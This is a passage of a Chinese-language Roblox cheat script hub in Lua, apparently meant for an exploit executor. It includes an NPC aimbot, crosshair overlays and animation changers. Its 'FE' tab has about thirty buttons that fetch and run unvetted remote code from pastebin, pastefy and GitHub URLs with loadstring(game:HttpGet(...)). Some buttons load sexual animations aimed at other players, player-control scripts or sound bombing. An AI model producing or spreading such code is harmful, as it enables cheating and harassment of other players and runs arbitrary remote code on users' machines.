            ["黑色"] = Color3.fromRGB(0, 0, 0),
            ["白色"] = Color3.fromRGB(255, 255, 255),
            ["红色"] = Color3.fromRGB(255, 0, 0),
            ["蓝色"] = Color3.fromRGB(0, 0, 255),
            ["绿色"] = Color3.fromRGB(0, 255, 0),
            ["黄色"] = Color3.fromRGB(255, 255, 0)
        }
        Crosshair.outlineColor = outlineColorMap[value]
        if Crosshair.enabled and Crosshair.outline then
            createCrosshair()
        end
    end)
    
    crosshairSection:Slider("描边厚度", "Outline Thickness", 1, 1, 3, false, function(value)
        Crosshair.outlineThickness = value
        if Crosshair.enabled and Crosshair.outline then
            createCrosshair()
        end
    end)
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local function onCharacterAdded()
        task.wait(1)
        if _G.AimBotState and _G.AimBotState.enabled then
            _G.StopAim()
            _G.StartAim()
        end
        
        if _G.FOVCircleState and _G.FOVCircleState.enabled then
            _G.DestroyFOV()
            _G.CreateFOV()
        end
        
        if _G.TargetRayState and _G.TargetRayState.enabled then
            _G.UpdateTargetRaySettings()
        end
        
        if _G.CrosshairState and _G.CrosshairState.enabled then
            _G.DestroyCrosshair()
            _G.CreateCrosshair()
        end
    end
    
    LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
end)

run(function()
    local workspace = workspace
    
    local function onCameraChanged()
        task.wait(0.1)
        if _G.FOVCircleState and _G.FOVCircleState.enabled then
            _G.DestroyFOV()
            _G.CreateFOV()
        end
        
        if _G.CrosshairState and _G.CrosshairState.enabled then
            _G.DestroyCrosshair()
            _G.CreateCrosshair()
        end
    end
    
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(onCameraChanged)
end)

local run = function(func) func() end

run(function()
    local Settings = {
        enabled = false,
        distance = 200,
        smoothness = 50,
        aimPart = "头部",
        wallCheck = false,
        aliveCheck = false,
        disableOnMove = false,
        moveThreshold = 0.3
    }
    
    local partMap = {
        ["头部"] = "Head",
        ["脖子"] = "HumanoidRootPart",
        ["躯干"] = "Torso",
        ["上半身"] = "UpperTorso",
        ["下半身"] = "LowerTorso"
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local Cam = workspace.CurrentCamera
    
    local aimConnection = nil
    local cachedNPCs = {}
    local lastScanTime = 0
    local scanInterval = 0.5
    
    local function getNPCs()
        local now = tick()
        if now - lastScanTime < scanInterval then
            return cachedNPCs
        end
        lastScanTime = now
        cachedNPCs = {}
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid") then
                local player = Players:GetPlayerFromCharacter(obj)
                if not player and obj ~= LocalPlayer.Character then
                    table.insert(cachedNPCs, obj)
                end
            end
        end
        return cachedNPCs
    end
    
    local function isMoving()
        local character = LocalPlayer.Character
        if not character then return false end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return false end
        return humanoid.MoveDirection.Magnitude > Settings.moveThreshold
    end
    
    local function getAimPart(npc)
        local partName = partMap[Settings.aimPart] or "Head"
        local part = npc:FindFirstChild(partName)
        if not part then
            part = npc:FindFirstChild("Head") or npc:FindFirstChild("HumanoidRootPart")
        end
        return part
    end
    
    local function isAlive(npc)
        if not Settings.aliveCheck then return true end
        local humanoid = npc:FindFirstChildOfClass("Humanoid")
        return humanoid and humanoid.Health > 0
    end
    
    local function findTarget()
        local closestTarget = nil
        local closestDistance = math.huge
        local camPos = Cam.CFrame.Position
        
        for _, npc in ipairs(getNPCs()) do
            if not isAlive(npc) then continue end
            
            local part = getAimPart(npc)
            if not part then continue end
            
            local pos = part.Position
            local dist = (camPos - pos).Magnitude
            
            if dist > Settings.distance then continue end
            
            if Settings.wallCheck then
                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {LocalPlayer.Character or workspace}
                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                local rayDirection = (pos - camPos).Unit * dist
                local raycastResult = workspace:Raycast(camPos, rayDirection, raycastParams)
                if raycastResult and not raycastResult.Instance:IsDescendantOf(npc) then
                    continue
                end
            end
            
            if dist < closestDistance then
                closestDistance = dist
                closestTarget = npc
            end
        end
        return closestTarget
    end
    
    local function smoothAim(targetPos)
        local currentCFrame = Cam.CFrame
        local targetCFrame = CFrame.lookAt(currentCFrame.Position, targetPos)
        if Settings.smoothness > 0 then
            local lerpFactor = 1 - (Settings.smoothness / 100)
            Cam.CFrame = currentCFrame:Lerp(targetCFrame, lerpFactor)
        else
            Cam.CFrame = targetCFrame
        end
    end
    
    local function startAim()
        if aimConnection then aimConnection:Disconnect() end
        aimConnection = RunService.RenderStepped:Connect(function()
            if not Settings.enabled then return end
            if Settings.disableOnMove and isMoving() then return end
            
            local target = findTarget()
            if target then
                local part = getAimPart(target)
                if part then
                    smoothAim(part.Position)
                end
            end
        end)
    end
    
    local function stopAim()
        if aimConnection then
            aimConnection:Disconnect()
            aimConnection = nil
        end
    end
    
    local aimSection = PIJIAOBEN:section("NPC自瞄", false)
    
    local aimToggle = aimSection:Toggle("开启自瞄", "Enable Aim", false, function(state)
        Settings.enabled = state
        if state then
            startAim()
        else
            stopAim()
        end
    end)
    
    aimSection:Slider("瞄准距离", "Aim Distance", 200, 10, 1000, false, function(value)
        Settings.distance = value
    end)
    
    aimSection:Slider("平滑度", "Smoothness", 50, 1, 100, false, function(value)
        Settings.smoothness = value
    end)
    
    aimSection:Dropdown('瞄准部位', 'Aim Part', {"头部", "脖子", "躯干", "上半身", "下半身"}, function(value)
        Settings.aimPart = value
    end)
    
    aimSection:Toggle("移动时暂停自瞄", "Disable On Move", false, function(state)
        Settings.disableOnMove = state
    end)
    
    aimSection:Toggle("活体检测", "Alive Check", false, function(state)
        Settings.aliveCheck = state
    end)
    
    aimSection:Toggle("墙壁检测", "Wall Check", false, function(state)
        Settings.wallCheck = state
    end)
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        if Settings.enabled then
            stopAim()
            startAim()
        end
    end)
end)

local PIJIAOBEN = XIAOPI:Tab("动画","136169594232359")

local about = PIJIAOBEN:section("播放动画", false)

local run = function(func) func() end

run(function()
    local animations = {
        ["跳舞1"] = "rbxassetid://1815255469",
        ["跳舞2"] = "rbxassetid://1827245394", 
        ["胜利"] = "rbxassetid://507771019",
        ["失败"] = "rbxassetid://507770453",
        ["欢呼"] = "rbxassetid://507770677",
        ["大笑"] = "rbxassetid://507770555",
        ["敬礼"] = "rbxassetid://507770996",
        ["坐下"] = "rbxassetid://507771133",
        ["躺下"] = "rbxassetid://507771443",
        ["走路"] = "rbxassetid://507770268",
        ["跑步"] = "rbxassetid://507767714",
        ["跳跃"] = "rbxassetid://507765000",
        ["鼓掌"] = "rbxassetid://507771088",
        ["挥手"] = "rbxassetid://507770239",
        ["机器人舞"] = "rbxassetid://2915865687",
        ["嘻哈舞"] = "rbxassetid://3189773368",
        ["机械舞"] = "rbxassetid://313762630"
    }
    
    local currentAnimationName = nil
    local isPlaying = false
    local customAnimationId = ""
    local loopState = false
    local playbackSpeed = 1
    
    local serverAnimationsList = {}
    local selectedServerAnimation = nil
    
    local function playAnimation(animationName, customId)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        local character = LocalPlayer.Character
        if not character then
            NotificationLibrary:SendNotification("Error", "角色未找到", 3)
            return false
        end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then
            NotificationLibrary:SendNotification("Error", "Humanoid未找到", 3)
            return false
        end
        
        if _G.CurrentAnimationTrack then
            _G.CurrentAnimationTrack:Stop()
            _G.CurrentAnimationTrack = nil
        end
        
        local animationId = customId or animations[animationName]
        
        if not animationId or animationId == "" then
            NotificationLibrary:SendNotification("Error", "未找到动画ID: " .. animationName, 3)
            return false
        end
        
        local animation = Instance.new("Animation")
        animation.AnimationId = animationId
        
        _G.CurrentAnimationTrack = humanoid:LoadAnimation(animation)
        
        _G.CurrentAnimationTrack.Looped = loopState
        _G.CurrentAnimationTrack:AdjustSpeed(playbackSpeed)
        _G.CurrentAnimationTrack:Play()
        
        currentAnimationName = animationName
        isPlaying = true
        
        local message = "正在播放: " .. animationName
        if customId then
            message = message .. " (自定义)"
        end
        message = message .. " - 循环: " .. (loopState and "开启" or "关闭")
        message = message .. " - 速度: " .. playbackSpeed .. "x"
        
        NotificationLibrary:SendNotification("Success", message, 3)
        return true
    end
    
    local function stopAnimation()
        if _G.CurrentAnimationTrack then
            _G.CurrentAnimationTrack:Stop()
            _G.CurrentAnimationTrack = nil
            isPlaying = false
            NotificationLibrary:SendNotification("Info", "动画已停止", 3)
            return true
        else
            NotificationLibrary:SendNotification("Info", "没有正在播放的动画", 3)
            return false
        end
    end
    
    local function copyToClipboard(text)
        if not text or text == "" then
            NotificationLibrary:SendNotification("Error", "没有可复制的ID", 3)
            return
        end
        
        local success, error = pcall(function()
            setclipboard(text)
        end)
        
        if success then
            NotificationLibrary:SendNotification("Success", "已复制到剪贴板: " .. text, 3)
        else
            NotificationLibrary:SendNotification("Error", "复制失败: " .. tostring(error), 3)
        end
    end
    
    local function scanServerAnimations()
        local newList = {}
        local count = 0
        
        for _, tool in pairs(workspace:GetDescendants()) do
            if tool:IsA("Tool") or tool:IsA("Model") then
                local anim = tool:FindFirstChildOfClass("Animation")
                if anim and anim.AnimationId and anim.AnimationId ~= "" then
                    local shortId = anim.AnimationId:gsub("rbxassetid://", "")
                    local animName = string.format("[工具] %s - %s (ID: %s)", tool.Name, (anim.Name ~= "" and anim.Name or "动画"), shortId)
                    newList[animName] = anim.AnimationId
                    count = count + 1
                end
            end
        end
        
        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player ~= game:GetService("Players").LocalPlayer and player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                            if track.Animation and track.Animation.AnimationId then
                                local shortId = track.Animation.AnimationId:gsub("rbxassetid://", "")
                                local animName = string.format("[玩家] %s - %s (ID: %s)", player.Name, (track.Animation.Name ~= "" and track.Animation.Name or "动画"), shortId)
                                newList[animName] = track.Animation.AnimationId
                                count = count + 1
                            end
                        end
                    end
                end
            end
        end
        
        for _, npc in pairs(workspace:GetDescendants()) do
            if npc:IsA("Model") and npc:FindFirstChild("Humanoid") and not game:GetService("Players"):GetPlayerFromCharacter(npc) then
                local humanoid = npc.Humanoid
                if humanoid then
                    local animator = humanoid:FindFirstChildOfClass("Animator")
                    if animator then
                        for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                            if track.Animation and track.Animation.AnimationId then
                                local shortId = track.Animation.AnimationId:gsub("rbxassetid://", "")
                                local animName = string.format("[NPC] %s - %s (ID: %s)", npc.Name, (track.Animation.Name ~= "" and track.Animation.Name or "动画"), shortId)
                                newList[animName] = track.Animation.AnimationId
                                count = count + 1
                            end
                        end
                    end
                end
            end
        end
        
        serverAnimationsList = newList
        return count, newList
    end
    
    local function getServerAnimationOptions()
        local options = {}
        for name, _ in pairs(serverAnimationsList) do
            table.insert(options, name)
        end
        table.sort(options)
        
        if #options == 0 then
            return {"暂无可用服务器动画"}
        end
        return options
    end
    
    local function updateServerDropdown()
        local options = getServerAnimationOptions()
        
        local success, err = pcall(function()
            about:SetDropdownOptions("ServerAnimationSelector", options)
        end)
        
        if not success then
            warn("更新服务器动画下拉菜单失败: " .. tostring(err))
        end
        
        return options
    end
    
    local function refreshServerAnimations()
        local count, _ = scanServerAnimations()
        local options = updateServerDropdown()
        return count, options
    end
    
    task.wait(0.5)
    scanServerAnimations()
    local initialOptions = getServerAnimationOptions()
    about:Label("服务器动画")    
    
    about:Dropdown("选择服务器动画", "ServerAnimationSelector", initialOptions, function(selectedAnimation)
        if selectedAnimation == "暂无可用服务器动画" then
            NotificationLibrary:SendNotification("Error", "服务器内没有可用的动画", 3)
            return
        end
        
        selectedServerAnimation = {
            name = selectedAnimation,
            id = serverAnimationsList[selectedAnimation]
        }
        
        currentAnimationName = selectedAnimation
        customAnimationId = selectedServerAnimation.id
        
        local displayId = selectedServerAnimation.id:gsub("rbxassetid://", "")
        NotificationLibrary:SendNotification("Info", "已选择: " .. selectedAnimation .. "\nID: " .. displayId, 5)
        
        if isPlaying then
            playAnimation(selectedAnimation, selectedServerAnimation.id)
        end
    end)
    
    about:Button("刷新服务器动画列表", function()
        local count, options = refreshServerAnimations()
        NotificationLibrary:SendNotification("Success", "扫描完成! 找到 " .. count .. " 个动画", 3)
    end)
   
    about:Label("内置动画")
    
    about:Dropdown("选择内置动画", "AnimationSelector", {
        "跳舞1", "跳舞2", "胜利", "失败", "欢呼", "大笑", "敬礼", 
        "坐下", "躺下", "走路", "跑步", "跳跃", "鼓掌", "挥手",
        "机器人舞", "嘻哈舞", "机械舞"
    }, function(selectedAnimation)
        currentAnimationName = selectedAnimation
        local animId = animations[selectedAnimation]
        local displayId = animId:gsub("rbxassetid://", "")
        NotificationLibrary:SendNotification("Info", "已选择: " .. selectedAnimation .. "\nID: " .. displayId, 5)
        
        if isPlaying then
            playAnimation(selectedAnimation)
        end
    end)
    
    about:Label("自定义动画")  
    
    about:Textbox("自定义动画ID", "CustomAnimation", "输入动画ID (rbxassetid://...)", function(input)
        customAnimationId = input
        if input ~= "" then
            local displayId = input:gsub("rbxassetid://", "")
            NotificationLibrary:SendNotification("Info", "已设置自定义动画ID: " .. displayId, 3)
        else
            NotificationLibrary:SendNotification("Info", "已清空自定义动画ID", 3)
        end
        
        if isPlaying and input ~= "" then
            playAnimation("自定义动画", input)
        end
    end)
    
    about:Label("动画设置")
    
    about:Button("复制当前动画ID", function()
        if selectedServerAnimation and selectedServerAnimation.id then
            copyToClipboard(selectedServerAnimation.id)
        elseif currentAnimationName and animations[currentAnimationName] then
            copyToClipboard(animations[currentAnimationName])
        elseif customAnimationId and customAnimationId ~= "" then
            copyToClipboard(customAnimationId)
        else
            NotificationLibrary:SendNotification("Error", "没有选中的动画", 3)
        end
    end)
    
    about:Textbox("播放速度", "", "输入速度倍数", function(speed)
        local newSpeed = tonumber(speed)
        if newSpeed then
            playbackSpeed = newSpeed
            if _G.CurrentAnimationTrack then
                _G.CurrentAnimationTrack:AdjustSpeed(playbackSpeed)
            end
            NotificationLibrary:SendNotification("Success", "播放速度已设置为: " .. playbackSpeed .. "x", 3)
        else
            NotificationLibrary:SendNotification("Error", "请输入有效的数字", 3)
        end
    end)
    
    about:Toggle("播放动画", "AnimationToggle", false, function(state)
        if state then
            if currentAnimationName then
                if serverAnimationsList[currentAnimationName] then
                    playAnimation(currentAnimationName, serverAnimationsList[currentAnimationName])
                else
                    playAnimation(currentAnimationName)
                end
            else
                NotificationLibrary:SendNotification("Warning", "请先选择一个动画", 3)
                about:SetToggleState("AnimationToggle", false)
            end
        else
            stopAnimation()
        end
    end)
    
    about:Toggle("循环播放", "LoopAnimation", false, function(state)
        loopState = state
        if _G.CurrentAnimationTrack then
            _G.CurrentAnimationTrack.Looped = state
            NotificationLibrary:SendNotification("Info", "循环播放: " .. (state and "开启" or "关闭"), 3)
        else
            NotificationLibrary:SendNotification("Info", "循环播放设置: " .. (state and "开启" or "关闭"), 3)
        end
    end)
    
    task.wait(1)
    refreshServerAnimations()
    
    _G.GetAnimationState = function()
        return {
            isPlaying = isPlaying,
            currentAnimationName = currentAnimationName,
            customAnimationId = customAnimationId,
            serverAnimationsList = serverAnimationsList
        }
    end
    
    _G.PlayAnimation = playAnimation
end)

run(function()
    local function onCharacterAdded(character)
        task.wait(2)
        
        local state = _G.GetAnimationState and _G.GetAnimationState()
        if state and state.isPlaying and state.currentAnimationName then
            if state.serverAnimationsList[state.currentAnimationName] then
                _G.PlayAnimation(state.currentAnimationName, state.serverAnimationsList[state.currentAnimationName])
            elseif state.currentAnimationName == "自定义动画" then
                _G.PlayAnimation("自定义动画", state.customAnimationId)
            else
                _G.PlayAnimation(state.currentAnimationName)
            end
        end
    end
    
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
end)

local animationSection = PIJIAOBEN:section("动画包", false)

local currentAnimId = nil
local animEnabled = false

local DefaultAnimations = {
    idle1 = "180435571",
    idle2 = "180435571",
    walk = "180426354",
    run = "180435874",
    jump = "180426354",
    climb = "180426354",
    fall = "180426354"
}

local AnimationPacks = {
    vampire = {
        name = "吸血鬼",
        idle1 = "1083445855",
        idle2 = "1083450166",
        walk = "1083473930",
        run = "1083462077",
        jump = "1083455352",
        climb = "1083439238",
        fall = "1083443587"
    },
    hero = {
        name = "英雄",
        idle1 = "616111295",
        idle2 = "616113536",
        walk = "616122287",
        run = "616117076",
        jump = "616115533",
        climb = "616104706",
        fall = "616108001"
    },
    zombie = {
        name = "经典僵尸",
        idle1 = "616158929",
        idle2 = "616160636",
        walk = "616168032",
        run = "616163682",
        jump = "616161997",
        climb = "616156119",
        fall = "616157476"
    },
    mage = {
        name = "法师",
        idle1 = "707742142",
        idle2 = "707855907",
        walk = "707897309",
        run = "707861613",
        jump = "707853694",
        climb = "707826056",
        fall = "707829716"
    },
    ghost = {
        name = "幽灵",
        idle1 = "616006778",
        idle2 = "616008087",
        walk = "616010382",
        run = "616013216",
        jump = "616008936",
        climb = "616003713",
        fall = "616005863"
    },
    elder = {
        name = "长者",
        idle1 = "845397899",
        idle2 = "845400520",
        walk = "845403856",
        run = "845386501",
        jump = "845398858",
        climb = "845392038",
        fall = "845396048"
    },
    float = {
        name = "悬浮",
        idle1 = "616006778",
        idle2 = "616008087",
        walk = "616013216",
        run = "616010382",
        jump = "616008936",
        climb = "616003713",
        fall = "616005863"
    },
    astronaut = {
        name = "宇航员",
        idle1 = "891621366",
        idle2 = "891633237",
        walk = "891667138",
        run = "891636393",
        jump = "891627522",
        climb = "891609353",
        fall = "891617961"
    },
    ninja = {
        name = "忍者",
        idle1 = "656117400",
        idle2 = "656118341",
        walk = "656121766",
        run = "656118852",
        jump = "656117878",
        climb = "656114359",
        fall = "656115606"
    },
    werewolf = {
        name = "狼人",
        idle1 = "1083195517",
        idle2 = "1083214717",
        walk = "1083178339",
        run = "1083216690",
        jump = "1083218792",
        climb = "1083182000",
        fall = "1083189019"
    },
    cartoon = {
        name = "卡通",
        idle1 = "742637544",
        idle2 = "742638445",
        walk = "742640026",
        run = "742638842",
        jump = "742637942",
        climb = "742636889",
        fall = "742637151"
    },
    pirate = {
        name = "海盗",
        idle1 = "750781874",
        idle2 = "750782770",
        walk = "750785693",
        run = "750783738",
        jump = "750782230",
        climb = "750779899",
        fall = "750780242"
    },
    stealth = {
        name = "潜行",
        idle1 = "1132473842",
        idle2 = "1132477671",
        walk = "1132510133",
        run = "1132494274",
        jump = "1132489853",
        climb = "1132461372",
        fall = "1132469004"
    },
    toy = {
        name = "玩具",
        idle1 = "782841498",
        idle2 = "782845736",
        walk = "782843345",
        run = "782842708",
        jump = "782847020",
        climb = "782843869",
        fall = "782846423"
    },
    knight = {
        name = "骑士",
        idle1 = "657595757",
        idle2 = "657568135",
        walk = "657552124",
        run = "657564596",
        jump = "658409194",
        climb = "658360781",
        fall = "657600338"
    },
    confident = {
        name = "自信",
        idle1 = "1069977950",
        idle2 = "1069987858",
        walk = "1070017263",
        run = "1070001516",
        jump = "1069984524",
        climb = "1069946257",
        fall = "1069973677"
    },
    popstar = {
        name = "流行明星",
        idle1 = "1212900985",
        idle2 = "1212900985",
        walk = "1212980338",
        run = "1212980348",
        jump = "1212954642",
        climb = "1213044953",
        fall = "1212900995"
    },
    princess = {
        name = "公主",
        idle1 = "941003647",
        idle2 = "941013098",
        walk = "941028902",
        run = "941015281",
        jump = "941008832",
        climb = "940996062",
        fall = "941000007"
    },
    cowboy = {
        name = "牛仔",
        idle1 = "1014390418",
        idle2 = "1014398616",
        walk = "1014421541",
        run = "1014401683",
        jump = "1014394726",
        climb = "1014380606",
        fall = "1014384571"
    },
    patrol = {
        name = "巡逻",
        idle1 = "1149612882",
        idle2 = "1150842221",
        walk = "1151231493",
        run = "1150967949",
        jump = "1150944216",
        climb = "1148811837",
        fall = "1148863382"
    }
}

local function setAnimation(animData)
    local player = game.Players.LocalPlayer
    if not player or not player.Character then
        return false
    end
    
    local animate = player.Character:FindFirstChild("Animate")
    if not animate then
        return false
    end
    
    animate.Disabled = true
    task.wait(0.1)
    
    if animate.idle and animate.idle.Animation1 then
        animate.idle.Animation1.AnimationId = "rbxassetid://" .. animData.idle1
    end
    if animate.idle and animate.idle.Animation2 then
        animate.idle.Animation2.AnimationId = "rbxassetid://" .. animData.idle2
    end
    if animate.walk and animate.walk.WalkAnim then
        animate.walk.WalkAnim.AnimationId = "rbxassetid://" .. animData.walk
    end
    if animate.run and animate.run.RunAnim then
        animate.run.RunAnim.AnimationId = "rbxassetid://" .. animData.run
    end
    if animate.jump and animate.jump.JumpAnim then
        animate.jump.JumpAnim.AnimationId = "rbxassetid://" .. animData.jump
    end
    if animate.climb and animate.climb.ClimbAnim then
        animate.climb.ClimbAnim.AnimationId = "rbxassetid://" .. animData.climb
    end
    if animate.fall and animate.fall.FallAnim then
        animate.fall.FallAnim.AnimationId = "rbxassetid://" .. animData.fall
    end
    
    animate.Disabled = false
    return true
end

local function resetToDefault()
    local player = game.Players.LocalPlayer
    if not player or not player.Character then
        return
    end
    
    local animate = player.Character:FindFirstChild("Animate")
    if not animate then
        return
    end
    
    animate.Disabled = true
    task.wait(0.1)
    
    if animate.idle and animate.idle.Animation1 then
        animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.idle1
    end
    if animate.idle and animate.idle.Animation2 then
        animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.idle2
    end
    if animate.walk and animate.walk.WalkAnim then
        animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.walk
    end
    if animate.run and animate.run.RunAnim then
        animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.run
    end
    if animate.jump and animate.jump.JumpAnim then
        animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.jump
    end
    if animate.climb and animate.climb.ClimbAnim then
        animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.climb
    end
    if animate.fall and animate.fall.FallAnim then
        animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=" .. DefaultAnimations.fall
    end
    
    animate.Disabled = false
end

local function reapplyAnimation()
    if animEnabled and currentAnimId then
        task.wait(0.5)
        setAnimation(currentAnimId)
    end
end

local player = game.Players.LocalPlayer
player.CharacterAdded:Connect(function()
    reapplyAnimation()
end)

local packNames = {}
for _, pack in pairs(AnimationPacks) do
    table.insert(packNames, pack.name)
end

animationSection:Dropdown("选择动画包", "anim_pack", packNames, function(selected)
    for _, pack in pairs(AnimationPacks) do
        if pack.name == selected then
            currentAnimId = pack
            if animEnabled then
                setAnimation(pack)
            end
            break
        end
    end
end)

animationSection:Toggle("开启/关闭动画包", "anim_toggle", false, function(Value)
    animEnabled = Value
    if Value then
        if currentAnimId then
            setAnimation(currentAnimId)
        else
            for _, pack in pairs(AnimationPacks) do
                setAnimation(pack)
                currentAnimId = pack
                break
            end
        end
    else
        resetToDefault()
    end
end)

local PIJIAOBEN = XIAOPI:Tab("FE","136169594232359")

local about = PIJIAOBEN:section("FE", true)

about:Button("CMD", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/testing-main.lua"))()
end)
about:Button("祖国人", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/-/refs/heads/main/祖国人汉化"))()
end)
about:Button("C00LGUI", function()
    loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
end)
about:Button("1x1x1x1", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
end)
about:Button("大长腿", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7291747e9f093555573e027621f08d6e/raw/23b48f2463942befe19d81aa8a06e3222996242c/FE%2520Da%2520Feets'))()
end)
about:Button("用头", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BK4Q0DfU"))()
end)
about:Button("复仇者", function()
    loadstring(game:HttpGet(('https://pastefy.ga/iGyVaTvs/raw'),true))()
end)
about:Button("鼠标", function()
    loadstring(game:HttpGet(('https://pastefy.ga/V75mqzaz/raw'),true))()
end)
about:Button("变怪物", function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/jfryBKds"))()
end)
about:Button("香蕉枪", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/BananaGunByNerd.lua"))()
end)
about:Button("超长级把", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ESWSFND7", true))()
end)
about:Button("动画中心", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)
about:Button("变玩家",function()
loadstring(game:HttpGet("https://pastebin.com/raw/PvnN4B8R"))()
end)
about:Button("猫娘R63", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
end)
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local currentAnimationTrack = nil
local currentRestartTimer = nil
local isPlaying = false

local function getAnimationId(humanoid)
    if humanoid.RigType == Enum.HumanoidRigType.R15 then
        return "rbxassetid://698251653"
    else
        return "rbxassetid://72042024"
    end
end

local function stopAnimation()
    if currentRestartTimer then
        currentRestartTimer:Disconnect()
        currentRestartTimer = nil
    end
    if currentAnimationTrack then
        currentAnimationTrack:Stop()
        currentAnimationTrack = nil
    end
    isPlaying = false
end

local function playAnimation()
    if not currentAnimationTrack then return end
    
    currentAnimationTrack:Play()
    currentAnimationTrack.TimePosition = 0.5
    currentAnimationTrack:AdjustSpeed(1.8)
    
    if currentRestartTimer then
        currentRestartTimer:Disconnect()
    end
    
    currentRestartTimer = game:GetService("RunService").Heartbeat:Connect(function()
        if currentAnimationTrack and currentAnimationTrack.IsPlaying and currentAnimationTrack.TimePosition >= 0.70 then
            currentRestartTimer:Disconnect()
            playAnimation()
        end
    end)
    isPlaying = true
end

local function startAnimation()
    local character = localPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local animation = Instance.new("Animation")
    animation.AnimationId = getAnimationId(humanoid)
    
    currentAnimationTrack = humanoid:LoadAnimation(animation)
    currentAnimationTrack.Looped = false
    
    playAnimation()
end

about:Toggle("导管", "", false, function(state)
    if state then
        if not currentAnimationTrack or not currentAnimationTrack.IsPlaying then
            startAnimation()
        end
    else
        stopAnimation()
    end
end)

localPlayer.CharacterAdded:Connect(function()
    if isPlaying then
        stopAnimation()
        startAnimation()
    end
end)
about:Button("FE", function()
    loadstring(game:HttpGet('https://pastefy.ga/a7RTi4un/raw'))()
end)
about:Button("无敌少侠飞行 R15", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua"))()
end)
about:Button("无敌少侠飞行 R6", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%97%A0%E6%95%8C%E5%B0%91%E4%BE%A0%E9%A3%9E%E8%A1%8Cr6.txt"))()
end)
about:Button(
        "撸管 R6",
        function()
loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
        end
    )
    
about:Button(
        "撸管 R15",
        function()
loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
        end)
about:Button(
        "操人 R6",
        function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/YE-R6CB-SCRIPT.lua"))()
        end
    )
    
about:Button(
        "操人 R15",
        function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/YE-R15CB-SCRIPT.lua"))()
        end
    )

about:Button("Tuber93入侵弹窗图", function()
loadstring(game:HttpGet("https://pastefy.app/veGCWoZ6/raw"))()
end)

about:Button("修改皮脚本贴图天空", function()
loadstring(game:HttpGet("https://pastefy.app/HZaYQYHa/raw"))()
end)

about:Button("黑客入侵", function()
loadstring(game:HttpGet("https://pastefy.app/qQOkHeaY/raw"))()
end)

about:Button("VR视角",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
end)

about:Button("钓鱼18+", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/SolaraVersionRagdoll.lua"))()
end)

about:Button("控制玩家", function()
loadstring(game:HttpGet("https://github.com/XiaoYunUwU/XiaoYunUwU/raw/main/FE%20Script%2FChange%20Players%202022", true))()
end)
about:Button("PP", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/minecrafttotem/yzhs./main/Fe%20pp%20script%20very%20fun"))()
end)

about:Button("太空狼人杀", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/Amongus", true))()
end)
about:Button("死侍", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/Deadpool", true))()
end)
about:Button("埼玉", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/FE/Saitama", true))()
end)
about:Button("声音轰炸", function()
